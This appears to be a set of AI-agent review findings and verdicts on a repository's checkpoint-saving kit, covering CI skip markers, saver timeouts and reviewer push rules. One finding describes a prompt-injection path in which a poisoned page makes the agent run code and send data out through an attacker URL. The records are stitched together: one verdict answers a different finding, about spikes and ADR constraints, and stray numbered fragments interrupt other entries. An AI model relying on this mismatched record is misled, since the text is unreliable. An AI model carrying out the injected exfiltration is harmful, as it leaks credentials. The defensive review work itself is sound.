findings.detail: How it can be exploited: an agent with Bash pastes command output (gh auth status, an env dump, a proxy URL with credentials) or a prompt-injected token into its notes file. Within 10 minutes `watch` commits it and pushes it to the public repository, and no human looks at it first. The rules forbid rewriting history, so the secret cannot then be scrubbed by policy. Deleting the checkpoint at the end does not help: the plan itself says the history keeps it. I reproduced it in a scratch repository (/tmp/cpprobe-eU54cZ, driver at /tmp/claude-0/-home-user-Shamble-Frontlines/dbb5e494-b49f-5970-85a2-528a1e15b24b/scratchpad/probe/probe2.mjs): a file .checkpoints/x/raw.txt holding 'ghp_' plus 36 characters was saved with exit 0, and the remote then listed .checkpoints/x/raw.txt. The 131 KB of checkpoints already on this branch scanned clean (no token patterns, no email addresses, no credential URLs). This is the step that turns 'agents write notes' into 'agents publish notes unattended'.

findings.detail: How it can be exploited: a night research item fetches a page or a search result that an attacker controls or has poisoned. The page tells the agent to write a file and run an allowed command (for example `node tools/preview.js . eval <file>`, which runs the file as Node code: tools/preview.js:92 and 107 use vm.runInThisContext, and settings.json:8 allows the command). The agent then sends data out with WebFetch(https://attacker/?d=...), or acts with the session's GitHub credential: it pushes to cs/ or claude/ branches and posts comments as Mergincanli. NIGHT_SHIFT rule 2 and CLAUDE.md's merge rule treat that account as trusted. So the session does hold something worth stealing: a credential that can push and speak as the trusted identity. The CLAUDE.md 'Never' line is the only defence, and it is a soft one. The three dangerous ingredients are all present together (untrusted content, tools that act, a way to send data out), and at night nobody is watching.

findings.detail: Reproduced in /tmp/cpprobe-eU54cZ: (1) with the folder deleted from disk but still in the index, `save x -m 'final delete'` exited 0 and made 'checkpoint(x): final delete [skip ci]'. The check only looks at commits already ahead, and an empty ahead list returns true. (2) A push that carried a code commit (a.js) with `-m 'step [ci skip]' --trailer 'skip-checks: true'` exited 0, and the message kept both markers, so GitHub skips CI for code. (3) Nothing stops `watch` or `save` after the PR is marked ready, so a reviewer's notes, like these, would move an approved head. All three fail safe for merging: main's ruleset requires gate and smoke on the head, so a [skip ci] head stays pending. sweeps.title: The commit that deletes the checkpoint gets [skip ci] if made with checkpoint.mjs save, so the final head never runs gate/smoke
sweeps.detail: CHECKPOINTS.md:90 says "A commit that pushes only checkpoint files carries `[skip ci]`". CHECKPOINTS.md:123-124 says the deletion commit "runs CI (no `[skip ci]`)". The deletion commit touches only .checkpoints/, and §3 (:50-52) names `checkpoint.mjs save` as the one command for checkpoint commits. In the script, onlyCheckpointsAhead() is computed before the commit, over the commits that are not pushed yet. With nothing else unpushed the loop has nothing to check and returns true, so `save` stages the deletion (`git add -A -- .checkpoints/`) and adds ' [skip ci]'. The header comment at :11-12 ("the final commit ... always runs CI") is false for that path. The result: the ready head has no gate/smoke run, and main's ruleset blocks the merge (advisor.md Never: gate and smoke must pass on the approved SHA). Evidence is from reading the code; a scratch-repo run was blocked by the rm -rf deny rule.
sweeps.fix: CHECKPOINTS.md:123-124: replace "in the last commit before the PR is marked ready\n   for review. That commit runs CI (no `[skip ci]`)." with "in the last commit before the PR is marked ready\n   for review, made with plain `git commit` and `git push`, never `checkpoint.mjs save` (save would mark it `[skip ci]`). That commit runs CI." And harden the script: in save(), set skip = false when the staged diff deletes `.checkpoints/<slug>.md` (`git diff --cached --name-only --diff-filter=D -- .checkpoints/<slug>.md` is non-empty). Add a test for that case.

verdict.evidence:
The finding holds. I checked it against the code; I did not run the script.

1. The script has no special case for the deletion commit. In `.claude/scripts/checkpoint.mjs:100-105`, `save()` runs `git add -A -- .checkpoints/`. It then sets `skip = onlyCheckpointsAhead(branch)` before it commits, and adds ' [skip ci]' when that is true.
2. `onlyCheckpointsAhead()` (:64-74) only looks at commits already made but not yet pushed (`rev-list origin/<branch>..HEAD`). If everything else is already pushed, its loop has nothing to check and it returns true (:73).
3. The commit itself is `git commit --only ... -- .checkpoints/` (:107), so a `save` commit only ever holds checkpoint files. A deletion of `.checkpoints/kit-v3-0.md` and `.checkpoints/kit-v3-0/`, made with `save` after the step's work is pushed, is therefore always marked `[skip ci]`.
4. That contradicts three places:
   - the script's own header at :11-12: "the final commit of a change-set (which deletes the checkpoint) always runs CI";
   - `.claude/CHECKPOINTS.md:123-124`: "That commit runs CI (no `[skip ci]`)";
   - the approved plan's risk 4 at `.checkpoints/kit-v3-0/plan.md:166-167`: "the final commit (checkpoint deleted) is never skip-ci". The plan review's trace in `plan-review-verdicts.json` accepts that risk only on this premise ("as long as the final head is never skip-ci").
5. Nothing tells the session to avoid `save` for the deletion:
   - `CHECKPOINTS.md:50-52` (§3) names `checkpoint.mjs save` as the one command for checkpoint commits;
   - `CHECKPOINTS.md:90` says a commit pushing only checkpoint files carries `[skip ci]`;
   - §9 (:123-124) does not say which command makes the deletion commit.
6. The tests miss this case. `.claude/scripts/checkpoint.test.mjs:106-117` covers work-plus-notes (no skip) and notes-only (skip), but not a deletion.
7. The effect is real. `.github/workflows/gate.yml` runs on push and pull_request, and the plan-review trace notes that '[skip ci]' skips both. The ready head would have no gate or smoke run, and main's protection requires both on the PR head.
verdict.better_fix:
Fix the script, since its header promises that the final commit always runs CI.

1. In `.claude/scripts/checkpoint.mjs` `save()`, replace line 104 with:
   `const deletesTask = git('diff', '--cached', '--name-only', '--diff-filter=D', '--', `${DIR}${o.slug}.md`).out !== '';`
   `const skip = !deletesTask && onlyCheckpointsAhead(branch);`
2. Add a case to `.claude/scripts/checkpoint.test.mjs`:
   - save a note at `.checkpoints/test.md` and push it;
   - delete that file and run `save test -m final`;
   - assert the last subject does not match /skip ci/.
3. Make the doc say the same. In `.claude/CHECKPOINTS.md:123-124`, after "That commit runs CI (no `[skip ci]`)", add: "`checkpoint.mjs save` never marks a commit that deletes `.checkpoints/<task-slug>.md` as `[skip ci]`".
4. Add the matching exception to the `[skip ci]` sentence at `CHECKPOINTS.md:90`.

If the script is not changed, the doc-only fix is the reviewer's wording at :123-124: make the deletion commit with plain `git commit` and `git push`, never `checkpoint.mjs save`. Line 11 of the script must then be corrected too.

sweeps.title: Routine sessions run at the default (medium) effort, against 'high by default' and brief §3, and the night shift's main session builds
sweeps.where: CLAUDE.md:123 and CLAUDE.md:131-132 vs .claude/NIGHT_SHIFT.md:35-37; brief §2a and §3
sweeps.detail: CLAUDE.md:123: "Effort is always stated (Opus 5.5 defaults to medium): `high` by default". CLAUDE.md:131-132: "A routine has a model setting but no effort setting, so its session runs at the model's default", which is medium. NIGHT_SHIFT.md:37: "build → the main session builds". verdict.evidence:

- CLAUDE.md:130-131 (the finding cites 131-132) says "A routine has a model setting but no effort setting, so its session runs at the model's default; the agents it starts follow the rules above." So the routine's own session runs at medium.
- .claude/NIGHT_SHIFT.md:31-33 says a NEEDS PLAN item "gets a written plan", written in the routine's own session.

- .claude/NIGHT_SHIFT.md:46-52 has the night report written by that same session.

1. It says "neither file names the gap". That is overstated: CLAUDE.md:130-131 states the routine limitation. What the files leave out is what that limitation means for the work NIGHT_SHIFT.md:37 gives the main session.
2. Brief §3 ("effort high", lines 103 and 108) belongs to step 2, the routine setup after merge. Plan line 17 defers it, and condition 10 forbids claiming "effort high" there unless it is verified. So §3 is not violated by this diff; the conflict is with §2a.

The internal sweeps also flagged this point: .checkpoints/kit-v3-0/final-sweep-A.md:12,15 (finding M4) and final-sweep-B.md:5,27 (L8).

sweeps.title: CHECKPOINTS §1 makes 'a review of a large diff' a task that commits and pushes a checkpoint, but reviewers may never push

verdict.evidence:
The conflict is real but small, and only the PR Advisor case actually breaks. The reviewer agents are already covered by §4.

- .claude/CHECKPOINTS.md:8-9 says every task of more than one step "keeps a checkpoint on its own branch". It lists "a review of a large diff" as one of those tasks.
- .claude/CHECKPOINTS.md:48 says "Commit and push it each time".

- .claude/agents/advisor.md:67 says the advisor runs "as the PR Advisor routine". Lines 128-131 say its notes go only under .checkpoints/<task-slug>/advisor-<part>.md and to "Never commit or push them, least of all to a PR's branch". 2. **The rule it seems to break has no exception.** CLAUDE.md:207 (Never): "edit before the plan is approved". Nothing in CLAUDE.md or .claude/CHECKPOINTS.md says checkpoint files are outside that rule.

sweeps.title: The background saver dies at Bash's 30-minute default timeout, not at the 110 minutes the doc promises
sweeps.detail: CHECKPOINTS.md:86-88: "It stops after 110 minutes (`--for`, under the 2-hour limit of a background command)". Bash `run_in_background` defaults to a 1,800,000 ms (30 min) timeout; the 2-hour value is only the maximum and must be passed. A session that follows the text as written has the saver stopped at 30 minutes. It makes one last save on SIGTERM (checkpoint.mjs:126), then stops saving for the rest of a long workflow, which is the cut-off case the saver exists for.
sweeps.fix: CHECKPOINTS.md:83-84: replace "start the saver in the background (Bash\n`run_in_background`)" with "start the saver in the background (Bash\n`run_in_background` with `timeout: 7200000`; the default timeout stops it after 30 minutes)".

verdict.evidence:
The finding holds up. In .claude/CHECKPOINTS.md, lines 83-84 say to start the saver "in the background (Bash `run_in_background`)" and give no timeout. Lines 86-87 then promise "It stops after 110 minutes (`--for`, under the 2-hour limit of a background command)".

The Bash tool's own contract in this environment says that with run_in_background, "`timeout` is how long the command may run in the background (default 1800000, max 7200000); at that limit it is stopped". So 2 hours is only the maximum, and it applies only when the caller passes it. A session that follows the doc as written gets the 30-minute default.

The script behaves the way the finding says. .claude/scripts/checkpoint.mjs:34 sets the default to `for: 110`, line 116 sets `end = Date.now() + o.for * 60000`, and line 126 runs `process.on('SIGTERM', () => last('terminated'))`. When the harness stops it at 30 minutes, it makes one last save and exits. Nothing saves for the remaining 80 of the promised 110 minutes, and long runs are exactly what the saver is for.

Nowhere else in .claude/ or docs/V2_PHASE0_BRIEF.md says to pass `timeout: 7200000`; grepping both for "timeout", "7200000" and "run_in_background" finds only line 84. Severity: low. The doc is wrong, but the cost is lost checkpoint coverage, not data loss: the agents' notes stay on disk, and the saver also makes its last save on stop.
verdict.better_fix: In .claude/CHECKPOINTS.md:83-84, change "start the saver in the background (Bash\n`run_in_background`)" to "start the saver in the background (Bash\n`run_in_background` with `timeout: 7200000`; without it the tool stops the saver after its 30-minute default)". Optionally, change line 87 from "under the 2-hour limit of a background command" to "under the 2-hour maximum `timeout` of a background command", so the two sentences agree.

sweeps.title: CHECKPOINTS §1 makes a large review keep and push a checkpoint on its branch, but §5 and advisor.md forbid reviewers from pushing to a PR's branch
sweeps.detail: §1 says: "Every task of more than one step keeps a checkpoint on its own branch ... A task is a change-set, a research topic, a night-shift item, a review of a large diff, or any workflow run." §3 then says to commit and push it each time. A PR Advisor run is a multi-step review (gate, sim ×3) on a ready PR, and the only branch it has is the PR's. Following §1 and §3 would push .checkpoints/ to that branch. That changes the approved head and leaves checkpoint files on a ready PR, which is exactly what §5 ("Reviewer agents and the PR Advisor routine never push their notes to a PR's branch"), advisor.md:130 ("Never commit or push them, least of all to a PR's branch") and advisor.md:86 ("A ready PR has no .checkpoints/ files") forbid. A session cannot satisfy both.
sweeps.fix: In CHECKPOINTS.md:9 replace "a night-shift item, a review of a large diff, or any workflow run." with "a night-shift item, or any workflow run. A review (a reviewer agent, the advisor, the PR Advisor routine) keeps notes only (§4); when it runs on a PR's branch they stay uncommitted (§5)."

verdict.evidence:
The conflict is real, but narrower than the finding says. It only bites on a review of a READY PR. A review of a draft's final diff, run by the implementer session on its own branch (like this workflow), is fine.

- .claude/CHECKPOINTS.md:8-9 says: "Every task of more than one step keeps a checkpoint on its own branch: `.checkpoints/<task-slug>.md`. A task is a change-set, a research topic, a night-shift item, a review of a large diff, or any workflow run." Line 10: "The slug is the branch's slug."
- .claude/CHECKPOINTS.md:48 (§3) says: "Commit and push it each time." CLAUDE.md:135-137 repeats this ("keeps `.checkpoints/<task-slug>.md` on its branch ... commit and push it each time").
- .claude/CHECKPOINTS.md:91-93 (§5) says: "After that, nothing pushes to the PR's branch except a fix that goes back to review. Reviewer agents and the PR Advisor routine never push their notes to a PR's branch: that would change the head the advisor approved."
- .claude/CHECKPOINTS.md:125 (§9.3) says: "A ready PR has no `.checkpoints/` files." advisor.md:86 says the same.
- advisor.md:67 and :75-77: the PR Advisor routine runs once per ready PR, runs the full gate and sim.js on base and head, and works on the PR's checkout. That is a multi-step review of a possibly large diff.
- advisor.md:129-131 says: "Long reviews ... keep notes ... Never commit or push them, least of all to a PR's branch."

Nothing in the kit gives a ready-PR review a branch of its own, or says it is exempt from §1 and §3. Applied literally, the routine would commit and push `.checkpoints/<slug>.md` to the PR's branch. That breaks §5, §9.3 and advisor.md:130. The slug rule (line 10) would even reuse the change-set's own slug. The saver does not stop this either: it accepts any `cs/` or `claude/` branch (CHECKPOINTS.md:89), and PR branches are exactly those. Brief §2b rule 1 (V2_PHASE0_BRIEF.md:40) only says "every task of more than one step". "A review of a large diff" was added by CHECKPOINTS.md, so this gap is the kit's own, not the brief's.

The reviewer's fix goes too far. It drops "a review of a large diff" altogether, which also removes the legitimate case: the implementer session's final-diff review on its draft branch (CLAUDE.md protocol step 5, brief §2c "review once, on the final diff"). That review should keep a pushed checkpoint. The real gap is only the ready-PR exception.
verdict.better_fix:
Keep the task list and add the exception for ready-PR reviews. In .claude/CHECKPOINTS.md, at the end of line 10 (after "a cloud session on a `claude/…` branch uses the task's name."), add:
" Exception: a review of a ready PR (a reviewer agent, the advisor, the PR Advisor routine) keeps its checkpoint and notes in `.checkpoints/` uncommitted and never pushes them (§5, §9.3)."

Optional, for consistency: in CLAUDE.md:135 change "keeps `.checkpoints/<task-slug>.md` on its branch" to "keeps `.checkpoints/<task-slug>.md` on its branch (a review of a ready PR keeps it uncommitted: `.claude/CHECKPOINTS.md` §1)".

sweeps.title: The background saver is told to run in the background but not given a longer timeout, so it is killed at the 30-minute default instead of running 110 minutes
sweeps.detail: §5 says: "start the saver in the background (Bash `run_in_background`)" and "It stops after 110 minutes (`--for`, under the 2-hour limit of a background command)". The Bash tool's background limit defaults to 1800000 ms (30 minutes). The maximum is 7200000 ms, and only if `timeout` is passed. Followed as written, the saver gets SIGTERM after 30 minutes. It makes one last save and exits, and for the remaining 80 minutes of a workflow or night run the agents' notes are never pushed. That silently defeats brief §2b rule 2 ("a cut-off loses at most one step").

verdict.evidence:
The conflict is real if you read the rules literally, but it is narrower than the finding says. It is low severity and needs a decision, not an edit.

What the files say:
- CLAUDE.md:21-22 (new in this diff): "No engine code: throwaway spikes only, and only after Mustafa and the Advisor have approved the drafts; until then, stop."
- docs/adr/0000-template.md:38-40 (new in this diff): "The measurable pass marks a throwaway spike must meet before this decision is accepted ... No spike starts before Mustafa and the Advisor have approved the draft." So spikes run after a draft is approved and before it is accepted.
- CLAUDE.md:45-50: the heading "Hard constraints (change ONLY through an accepted ADR signed off by Mustafa, never on your own)" sits over the constraint lines. They include "Classic scripts sharing globals in a fixed load order ... index.html (file://)" and "Three.js r128 UMD ... No addons, no post-processing". The heading has no legacy-only scope.
- CLAUDE.md:51-53: "Phase 0 writes no v2 code. Constraints for v2 code come only from those drafts once Mustafa accepts them. Until then, the constraints above stand."
- .checkpoints/kit-v3-0/plan-review-verdicts.json:15 (condition 4) gives this sentence word for word. It also forbids scoping the constraints to the legacy game ("Narrowing their scope is a hard-constraint change"), and the critic agrees (verdicts.json:479).

So between draft approval and ADR acceptance, a spike is allowed (CLAUDE.md:21-22, template:39-40). In that same window the unscoped constraints still stand (CLAUDE.md:53). A spike for the rendering ADR on the WebGPU renderer, or a Rust/Wasm spike, cannot use r128 UMD and classic scripts. The template's "spike before acceptance" step cannot be followed without breaking a stated hard constraint.

What is overstated:
- "Phase 0 writes no v2 code" (CLAUDE.md:52) does not itself contradict line 21. The brief puts spikes after phase 0's "Then stop": V2_PHASE0_BRIEF.md:20-21 ("No engine code except throwaway spikes, and those only after the decisions are approved"), :141 and :144 ("spikes come after the decisions are approved").
- The real source of the conflict is the unscoped constraints combined with the template's ordering. The brief itself says only "after the decisions are approved"; it never says "before acceptance".
- Not urgent: no drafts exist yet. NIGHT_SHIFT.md:33 and engine-architect.md:46/52 already block spikes until the drafts are approved.
verdict.better_fix:
Edit no CLAUDE.md text. Line 52 is the advisor's condition-4 wording and the constraint lines must stay byte-identical. Changing line 52 alone would not resolve the conflict anyway, because line 53 ("Until then, the constraints above stand") would still bind the spikes. Instead, add one entry under "Decisions needed" in the kit-v3-0 report:

"KV3-SPIKE · Are the throwaway spikes allowed after the drafts are approved (in their own folder, never shipped, legacy files untouched) bound by today's hard constraints (Three.js r128 UMD, classic scripts, no addons), or must each ADR be accepted before its spike? · Why: CLAUDE.md:21-22 and the ADR template (0000-template.md:38-40) run spikes before acceptance, but CLAUDE.md:45-53 keeps the constraints in force until acceptance, so a WebGPU or Rust/Wasm spike would break them · Options: (a) spikes are exempt from the legacy constraints; Mustafa confirms this, and each draft states it under Consequences, 'Hard constraints that change'; (b) accept each ADR first, then spike, and change template line 39 from 'before this decision is accepted' to 'to confirm this decision' · Recommendation: (a), because the spike results are meant to inform acceptance."
